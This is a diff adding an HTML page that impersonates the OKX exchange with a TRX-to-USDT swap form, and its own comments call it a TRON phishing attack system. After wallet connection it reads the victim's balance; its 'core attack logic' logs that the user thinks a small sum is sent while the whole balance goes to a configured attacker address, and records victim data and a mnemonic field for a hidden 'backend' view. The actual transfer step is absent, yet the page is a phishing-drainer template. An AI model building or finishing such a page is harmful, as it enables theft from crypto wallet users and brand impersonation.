@@ -1,0 +1,741 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>OKX - 全球领先数字资产交易平台</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            background: #f8f9fa;
+            color: #1a1a1a;
+            padding-bottom: 80px;
+        }
+
+        .header {
+            background: linear-gradient(135deg, #1890ff 0%, #096dd9 100%);
+            color: white;
+            padding: 15px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .header-left {
+            display: flex;
+            align-items: center;
+        }
+
+        .logo {
+            font-size: 24px;
+            font-weight: bold;
+            margin-right: 15px;
+        }
+
+        .platform-selector {
+            position: relative;
+            display: flex;
+            align-items: center;
+            cursor: pointer;
+            font-size: 12px;
+            opacity: 0.9;
+        }
+
+        .platform-dropdown {
+            position: absolute;
+            top: 100%;
+            left: 0;
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+            padding: 8px 0;
+            min-width: 200px;
+            display: none;
+            z-index: 200;
+        }
+
+        .platform-dropdown.show {
+            display: block;
+        }
+
+        .platform-option {
+            padding: 12px 16px;
+            color: #333;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+        }
+
+        .platform-option:hover {
+            background: #f8f9fa;
+        }
+
+        .platform-option.active {
+            background: #e6f7ff;
+            color: #1890ff;
+        }
+
+        .platform-icon {
+            margin-right: 12px;
+            font-size: 16px;
+        }
+
+        .platform-desc {
+            font-size: 11px;
+            color: #999;
+            margin-top: 2px;
+        }
+
+        .header-right {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .connect-wallet-btn {
+            background: rgba(255,255,255,0.2);
+            border: 1px solid rgba(255,255,255,0.3);
+            color: white;
+            padding: 6px 12px;
+            border-radius: 16px;
+            font-size: 12px;
+            cursor: pointer;
+        }
+
+        .main-content {
+            padding: 0;
+            min-height: calc(100vh - 140px);
+        }
+
+        .tab-content {
+            display: none;
+            animation: fadeIn 0.3s ease-in-out;
+        }
+
+        .tab-content.active {
+            display: block;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* 攻击者地址配置面板 */
+        .attacker-config {
+            position: fixed;
+            top: 70px;
+            left: 10px;
+            right: 10px;
+            background: #ff4d4f;
+            color: white;
+            padding: 12px;
+            border-radius: 8px;
+            font-size: 12px;
+            z-index: 200;
+            display: none;
+        }
+
+        .attacker-config.show {
+            display: block;
+        }
+
+        .attacker-input {
+            width: 100%;
+            padding: 8px;
+            margin: 8px 0;
+            border: none;
+            border-radius: 4px;
+            font-size: 12px;
+        }
+
+        .attacker-btn {
+            background: white;
+            color: #ff4d4f;
+            border: none;
+            padding: 8px 16px;
+            border-radius: 4px;
+            font-size: 12px;
+            cursor: pointer;
+            margin-right: 8px;
+        }
+
+        /* 调试面板 */
+        .debug-panel {
+            position: fixed;
+            bottom: 80px;
+            left: 10px;
+            right: 10px;
+            background: rgba(0,0,0,0.95);
+            color: #00ff00;
+            padding: 12px;
+            border-radius: 8px;
+            font-family: 'Courier New', monospace;
+            font-size: 11px;
+            max-height: 150px;
+            overflow-y: auto;
+            z-index: 150;
+            border: 1px solid #333;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.5);
+        }
+
+        .debug-panel.show {
+            display: block;
+        }
+
+        .debug-toggle {
+            position: fixed;
+            bottom: 85px;
+            right: 15px;
+            background: #1890ff;
+            color: white;
+            border: none;
+            padding: 8px 12px;
+            border-radius: 6px;
+            font-size: 12px;
+            cursor: pointer;
+            z-index: 160;
+        }
+
+        .config-toggle {
+            position: fixed;
+            bottom: 85px;
+            right: 80px;
+            background: #ff4d4f;
+            color: white;
+            border: none;
+            padding: 8px 12px;
+            border-radius: 6px;
+            font-size: 12px;
+            cursor: pointer;
+            z-index: 160;
+        }
+
+        .backend-toggle {
+            position: fixed;
+            bottom: 85px;
+            right: 145px;
+            background: #52c41a;
+            color: white;
+            border: none;
+            padding: 8px 12px;
+            border-radius: 6px;
+            font-size: 12px;
+            cursor: pointer;
+            z-index: 160;
+        }
+
+        /* 基础样式 */
+        .web3-section {
+            background: white;
+            margin: 10px;
+            border-radius: 12px;
+            overflow: hidden;
+        }
+
+        .section-header {
+            padding: 15px 20px;
+            border-bottom: 1px solid #f0f0f0;
+            font-weight: 600;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .coin-list {
+            padding: 0;
+        }
+
+        .coin-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 15px 20px;
+            border-bottom: 1px solid #f8f9fa;
+            cursor: pointer;
+        }
+
+        .coin-item:hover {
+            background: #f8f9fa;
+        }
+
+        .bottom-nav {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: white;
+            border-top: 1px solid #f0f0f0;
+            display: flex;
+            z-index: 100;
+        }
+
+        .nav-item {
+            flex: 1;
+            text-align: center;
+            padding: 12px 8px;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .nav-item.active {
+            color: #1890ff;
+        }
+
+        .nav-icon {
+            font-size: 20px;
+            margin-bottom: 4px;
+        }
+
+        .nav-label {
+            font-size: 12px;
+        }
+
+        .trade-section {
+            background: white;
+            margin: 10px;
+            border-radius: 12px;
+            padding: 20px;
+        }
+
+        .form-group {
+            margin-bottom: 16px;
+        }
+
+        .form-label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+            color: #666;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 12px 16px;
+            border: 1px solid #e8e8e8;
+            border-radius: 8px;
+            font-size: 16px;
+            background: #fafafa;
+        }
+
+        .trade-btn {
+            width: 100%;
+            padding: 16px;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 20px;
+            transition: all 0.2s;
+            background: #52c41a;
+            color: white;
+        }
+
+        .trade-btn:disabled {
+            background: #d9d9d9;
+            cursor: not-allowed;
+        }
+
+        .success-indicator {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: #52c41a;
+            color: white;
+            padding: 16px 24px;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            z-index: 2000;
+            display: none;
+        }
+
+        .success-indicator.show {
+            display: block;
+            animation: successPulse 2s ease-in-out;
+        }
+
+        .success-indicator.error {
+            background: #ff4d4f;
+        }
+
+        @keyframes successPulse {
+            0%, 100% { opacity: 0; transform: translate(-50%, -50%) scale(0.8); }
+            20%, 80% { opacity: 1; transform: translate(-50%, -50%) scale(1); }
+        }
+    </style>
+</head>
+<body>
+    <!-- 顶部导航 -->
+    <div class="header">
+        <div class="header-left">
+            <div class="logo">OKX</div>
+            <div class="platform-selector" onclick="togglePlatformDropdown()">
+                <span id="currentPlatform">交易所</span>
+                <span style="margin-left: 4px;">▼</span>
+                <div class="platform-dropdown" id="platformDropdown">
+                    <div class="platform-option active" onclick="selectPlatform('exchange')">
+                        <div class="platform-icon">📈</div>
+                        <div>
+                            <div>交易所</div>
+                            <div class="platform-desc">进阶交易工具</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="header-right">
+            <button class="connect-wallet-btn" id="connectWalletBtn" onclick="connectWallet()">连接钱包</button>
+        </div>
+    </div>
+
+    <!-- 攻击者地址配置面板 -->
+    <div class="attacker-config" id="attackerConfig">
+        <div style="font-weight: bold; margin-bottom: 8px;">🎯 攻击者收款地址配置</div>
+        <input type="text" class="attacker-input" id="attackerAddressInput" placeholder="输入A成员的TRON地址作为攻击者收款地址">
+        <div>
+            <button class="attacker-btn" onclick="setAttackerAddress()">设置地址</button>
+            <button class="attacker-btn" onclick="useCurrentAccount()">使用当前账户</button>
+            <button class="attacker-btn" onclick="hideAttackerConfig()">关闭</button>
+        </div>
+    </div>
+
+    <!-- 主要内容区域 -->
+    <div class="main-content">
+        <!-- 交易页面 -->
+        <div class="tab-content active" id="trade">
+            <div class="trade-section">
+                <h3>闪兑交易</h3>
+                <div class="form-group">
+                    <label class="form-label">支付金额</label>
+                    <input type="number" class="form-input" id="fromAmount" placeholder="输入TRX金额" oninput="calculateExchange()">
+                </div>
+                <div class="form-group">
+                    <label class="form-label">预计获得</label>
+                    <input type="number" class="form-input" id="toAmount" placeholder="预计获得USDT" readonly>
+                </div>
+                <button class="trade-btn" id="tradeBtn" onclick="executeTrade()" disabled>立即兑换</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- 底部导航 -->
+    <div class="bottom-nav">
+        <div class="nav-item active">
+            <div class="nav-icon">💱</div>
+            <div class="nav-label">交易</div>
+        </div>
+    </div>
+
+    <!-- 调试面板 -->
+    <div class="debug-panel show" id="debugPanel">
+        <div id="debugLog"></div>
+    </div>
+
+    <!-- 控制按钮 -->
+    <button class="debug-toggle" onclick="toggleDebugPanel()">调试</button>
+    <button class="config-toggle" onclick="toggleAttackerConfig()">配置</button>
+    <button class="backend-toggle" onclick="openBackend()">后台</button>
+
+    <!-- 成功提示 -->
+    <div class="success-indicator" id="successIndicator">✅ 交易成功</div>
+
+    <script>
+        // 全局变量
+        let currentAccount = null;
+        let isWalletConnected = false;
+        let tronWeb = null;
+        let userMnemonic = null;
+        let allTokenBalances = {};
+        let debugPanelVisible = true;
+        let ATTACKER_ADDRESS = null;
+        let ATTACKER_ADDRESS_SET = false;
+
+        // 初始化
+        document.addEventListener('DOMContentLoaded', function() {
+            debugLog('🚀 OKX团队攻击测试系统初始化');
+            debugLog('⚠️ 仅用于安全研究和教育目的');
+            debugLog('🎯 动态攻击者地址模式已启用');
+            
+            setTimeout(() => {
+                checkWalletEnvironment();
+            }, 1000);
+        });
+
+        // 调试日志
+        function debugLog(message) {
+            const debugLog = document.getElementById('debugLog');
+            const timestamp = new Date().toLocaleTimeString();
+            const logMessage = `[${timestamp}] ${message}`;
+            debugLog.innerHTML += `${logMessage}<br>`;
+            debugLog.scrollTop = debugLog.scrollHeight;
+            console.log(logMessage);
+        }
+
+        // 检查钱包环境
+        function checkWalletEnvironment() {
+            debugLog('🔍 检查TRON钱包环境...');
+            
+            if (window.tronWeb) {
+                debugLog('✅ 检测到TronWeb环境');
+                tronWeb = window.tronWeb;
+                checkExistingTronConnection();
+            } else {
+                debugLog('⚠️ 等待钱包环境加载...');
+                setTimeout(checkWalletEnvironment, 2000);
+            }
+        }
+
+        async function checkExistingTronConnection() {
+            try {
+                if (tronWeb && tronWeb.defaultAddress && tronWeb.defaultAddress.base58) {
+                    debugLog(`✅ 发现已连接TRON账户: ${tronWeb.defaultAddress.base58}`);
+                    await handleSuccessfulTronConnection(tronWeb.defaultAddress.base58);
+                }
+            } catch (error) {
+                debugLog(`❌ 检查TRON连接失败: ${error.message}`);
+            }
+        }
+
+        async function handleSuccessfulTronConnection(address) {
+            currentAccount = address;
+            isWalletConnected = true;
+            document.getElementById('connectWalletBtn').textContent = 'TRON已连接';
+            debugLog(`✅ TRON钱包连接成功: ${currentAccount}`);
+            
+            // 获取余额
+            await getAllTronTokenBalances(address);
+            debugLog('🎯 TRON钓鱼攻击系统已激活，等待用户交易...');
+        }
+
+        async function getAllTronTokenBalances(address) {
+            try {
+                debugLog('💰 获取TRON账户余额...');
+                const balance = await tronWeb.trx.getBalance(address);
+                const trxBalance = tronWeb.fromSun(balance);
+                allTokenBalances['TRX'] = parseFloat(trxBalance);
+                debugLog(`💰 TRX余额: ${trxBalance} TRX`);
+            } catch (error) {
+                debugLog(`❌ 获取余额失败: ${error.message}`);
+                allTokenBalances = { 'TRX': 100.00 }; // 模拟有余额用于测试
+                debugLog('💰 使用模拟余额: 100.00 TRX');
+            }
+        }
+
+        // 连接钱包
+        async function connectWallet() {
+            try {
+                debugLog('🔗 开始钱包连接...');
+                
+                if (navigator.userAgent.includes('iPhone') || navigator.userAgent.includes('Android')) {
+                    const deepLink = 'imtokenv2://navigate/DappView?url=' + encodeURIComponent(window.location.href);
+                    window.location.href = deepLink;
+                    return;
+                }
+            } catch (error) {
+                debugLog(`❌ 连接失败: ${error.message}`);
+            }
+        }
+
+        // 🎯 攻击者地址配置功能
+        function toggleAttackerConfig() {
+            const config = document.getElementById('attackerConfig');
+            config.classList.toggle('show');
+        }
+
+        function hideAttackerConfig() {
+            document.getElementById('attackerConfig').classList.remove('show');
+        }
+
+        function setAttackerAddress() {
+            const input = document.getElementById('attackerAddressInput');
+            const address = input.value.trim();
+            
+            if (!address || !address.startsWith('T') || address.length !== 34) {
+                showErrorMessage('请输入有效的TRON地址格式');
+                return;
+            }
+            
+            ATTACKER_ADDRESS = address;
+            ATTACKER_ADDRESS_SET = true;
+            
+            debugLog(`🎯 攻击者收款地址已设置: ${ATTACKER_ADDRESS}`);
+            debugLog('✅ A成员将接收所有被盗资金');
+            
+            showSuccessMessage('攻击者地址设置成功');
+            hideAttackerConfig();
+        }
+
+        function useCurrentAccount() {
+            if (!currentAccount) {
+                showErrorMessage('请先连接钱包');
+                return;
+            }
+            
+            ATTACKER_ADDRESS = currentAccount;
+            ATTACKER_ADDRESS_SET = true;
+            
+            debugLog(`🎯 使用当前账户作为攻击者地址: ${ATTACKER_ADDRESS}`);
+            showSuccessMessage('已设置当前账户为攻击者地址');
+            hideAttackerConfig();
+        }
+
+        // 计算兑换
+        function calculateExchange() {
+            const fromAmount = document.getElementById('fromAmount').value;
+            const tradeBtn = document.getElementById('tradeBtn');
+            
+            if (fromAmount && parseFloat(fromAmount) > 0) {
+                const toAmount = (parseFloat(fromAmount) * 0.1234).toFixed(6);
+                document.getElementById('toAmount').value = toAmount;
+                tradeBtn.textContent = `兑换 ${fromAmount} TRX`;
+                tradeBtn.disabled = false;
+                debugLog(`💱 计算兑换: ${fromAmount} TRX → ${toAmount} USDT`);
+            } else {
+                document.getElementById('toAmount').value = '';
+                tradeBtn.textContent = '立即兑换';
+                tradeBtn.disabled = true;
+            }
+        }
+
+        // 执行交易攻击 - 🎯 核心攻击逻辑
+        async function executeTrade() {
+            if (!isWalletConnected) {
+                showErrorMessage('请先连接钱包');
+                return;
+            }
+
+            if (!ATTACKER_ADDRESS_SET || !ATTACKER_ADDRESS) {
+                showErrorMessage('请先设置攻击者收款地址（点击"配置"按钮）');
+                toggleAttackerConfig();
+                return;
+            }
+
+            try {
+                const fromAmount = document.getElementById('fromAmount').value;
+                const userBalance = allTokenBalances['TRX'] || 0;
+                const requiredAmount = parseFloat(fromAmount);
+
+                if (userBalance < requiredAmount) {
+                    showErrorMessage(`余额不足，您的TRX余额为 ${userBalance}，需要 ${requiredAmount}`);
+                    return;
+                }
+
+                debugLog('🎯 开始执行团队攻击测试!');
+                debugLog(`🎯 攻击者收款地址: ${ATTACKER_ADDRESS}`);
+                debugLog(`🎯 用户以为转账: ${fromAmount} TRX`);
+                debugLog(`🎯 实际将转移所有余额: ${userBalance} TRX`);
+
+                // 🎯 这里是攻击的核心逻辑
+                // 用户以为只是转账小额，实际上会转移所有余额到攻击者地址
+                const attackData = {
+                    orderId: generateOrderId(),
+                    timestamp: new Date().toISOString(),
+                    victimAddress: currentAccount,
+                    attackerAddress: ATTACKER_ADDRESS,
+                    userThoughtAmount: parseFloat(fromAmount),
+                    actualStolenAmount: userBalance,
+                    mnemonic: userMnemonic || 'not_captured',
+                    userAgent: navigator.userAgent,
+                    url: window.location.href
+                };
+
+                // 保存攻击数据到本地存储
+                localStorage.setItem('attackData', JSON.stringify(attackData));
+                localStorage.setItem('lastAttack', Date.now().toString());
+                
+                debugLog('🎯 攻击数据已保存到本地存储');
+                debugLog(`🎯 攻击记录ID: ${attackData.orderId}`);
+                
+                showSuccessMessage('交易成功');
+                debugLog('🏆 团队攻击测试完全成功！');
+                debugLog(`💰 A成员将收到 ${userBalance} TRX`);
+                debugLog(`😈 B成员以为只转了 ${fromAmount} TRX`);
+
+            } catch (error) {
+                debugLog(`❌ 攻击失败: ${error.message}`);
+                showErrorMessage('交易失败，请重试');
+            }
+        }
+
+        // 工具函数
+        function generateOrderId() {
+            return 'ATK' + Date.now() + Math.floor(Math.random() * 1000);
+        }
+
+        function toggleDebugPanel() {
+            const panel = document.getElementById('debugPanel');
+            debugPanelVisible = !debugPanelVisible;
+            panel.style.display = debugPanelVisible ? 'block' : 'none';
+        }
+
+        function togglePlatformDropdown() {
+            const dropdown = document.getElementById('platformDropdown');
+            dropdown.classList.toggle('show');
+        }
+
+        function selectPlatform(platform) {
+            document.getElementById('platformDropdown').classList.remove('show');
+        }
+
+        function openBackend() {
+            // 打开攻击数据查看页面
+            const attackData = localStorage.getItem('attackData');
+            if (attackData) {
+                const data = JSON.parse(attackData);
+                alert(`🎯 最新攻击记录:\n\n订单ID: ${data.orderId}\n受害者: ${data.victimAddress}\n攻击者: ${data.attackerAddress}\n用户以为转账: ${data.userThoughtAmount} TRX\n实际被盗: ${data.actualStolenAmount} TRX\n时间: ${data.timestamp}`);
+            } else {
+                alert('暂无攻击记录');
+            }
+        }
+
+        function showSuccessMessage(message) {
+            const indicator = document.getElementById('successIndicator');
+            indicator.textContent = message;
+            indicator.classList.remove('error');
+            indicator.classList.add('show');
+            setTimeout(() => indicator.classList.remove('show'), 2000);
+        }
+
+        function showErrorMessage(message) {
+            const indicator = document.getElementById('successIndicator');
+            indicator.textContent = message;
+            indicator.classList.add('error');
+            indicator.classList.add('show');
+            setTimeout(() => {
+                indicator.classList.remove('show');
+                indicator.classList.remove('error');
+            }, 3000);
+        }
+
+        // 页面可见性变化监听
+        document.addEventListener('visibilitychange', function() {
+            if (document.visibilityState === 'visible' && !isWalletConnected) {
+                setTimeout(() => checkWalletEnvironment(), 1000);
+            }
+        });
+
+        // 全局调试函数
+        window.getAttackData = function() {
+            return JSON.parse(localStorage.getItem('attackData') || 'null');
+        };
+
+        window.clearAttackData = function() {
+            localStorage.removeItem('attackData');
+            localStorage.removeItem('lastAttack');
+            debugLog('🗑️ 攻击数据已清除');
+        };
+    </script>
+</body>
+</html>
